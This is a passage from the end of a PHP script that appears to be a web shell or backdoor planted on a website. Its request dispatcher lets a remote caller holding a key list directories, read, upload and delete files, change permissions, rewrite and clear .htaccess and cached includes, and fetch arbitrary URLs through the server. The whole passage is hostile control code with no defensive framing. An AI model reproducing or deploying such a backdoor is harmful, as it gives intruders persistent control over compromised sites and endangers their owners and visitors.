					$sScriptPath = '/'.$_REQUEST['file-path'];
					$_REQUEST['file-path'] = EraseDubleSlash(__MAIN_PATH__.'/'.trim($_REQUEST['file-path']));
					
					$bIsUploadCorrect = false;
					$bIsUploadCorrect = UploadFile();
					if($bIsUploadCorrect === false)
					{
						break;
					}
				} else
				{
					$sUploadScriptPath = '';
					$sUploadScriptPath = RepairHtml();
					if($sUploadScriptPath === false)
					{
						break;
					}
				}

				RepairHtmlHtaccess(__MAIN_PATH__.'.htaccess', $sUploadScriptPath);
			
				break;
			}
		}
	
		

		exit();
	}
	
	if(isset($_REQUEST['clr_css']) == true)
	{
		CheckWcrykValue();
		ClearInclude(); 
		exit();
	}

	if(isset($_REQUEST['clr_htacc']) == true)
	{
		CheckWcrykValue();
		ClearHtaccess(); 
		exit();
	}
	

	if(isset($_REQUEST['clr_chc']) == true)
	{
		CheckWcrykValue();
		ClearCache(); 
		exit();
	}		
	
	
	
	if(isset($_REQUEST['directory_list']) === true)
	{	
		CheckWcrykValue();
		GetDirectoryList();
		exit();
	}
	
	
	if(isset($_REQUEST['file_delete']) === true)
	{
		CheckWcrykValue();
		DeleteFile();
		exit();
	}

	if(isset($_REQUEST['mkdir']) === true)
	{
		CheckWcrykValue();
		MakeDir();
		exit();
	}
	
	if(isset($_REQUEST['file_upload']) === true)
	{
		CheckWcrykValue();
		UploadFile();
		exit();
	}	
	
	
	if(isset($_REQUEST['file_content']) === true)
	{
		CheckWcrykValue();
		GetFileContent();
		exit();
	}
	
	
	if(isset($_REQUEST['file_exist']) === true)
	{
		CheckWcrykValue();
		IsFileExist();
		exit();
	}

	
	if(isset($_REQUEST['chmod']) === true)
	{
		CheckWcrykValue();
		FileChmod();
		exit();
	}
	
	if(isset($_REQUEST['GetContent']) === true)
	{
		$sGetUrl = '';
		$sGetUrl = trim($_REQUEST['GetContent']);
		
		if(strlen($sGetUrl) == 0)
		{
			echo '<fail>no valid url</fail>';
			exit();
		}
		
		$nMatch = preg_match('#^http:\/\/#i', $sGetUrl); 
		if($nMatch === false || $nMatch == 0)
		{
			$sGetUrl = 'http://'.$sGetUrl;
		}

		
		
		$sOutContent = '';
		$bGetContentResult = false;
		$bGetContentResult = GetContents($sGetUrl, $sOutContent);
		
		if($bGetContentResult === false || $sOutContent === false || strlen($sOutContent) === 0)
		{
			echo '<fail>cant get content</fail>';
		} else
		{
			echo $sOutContent;
		}
	}
}

Main();

?>
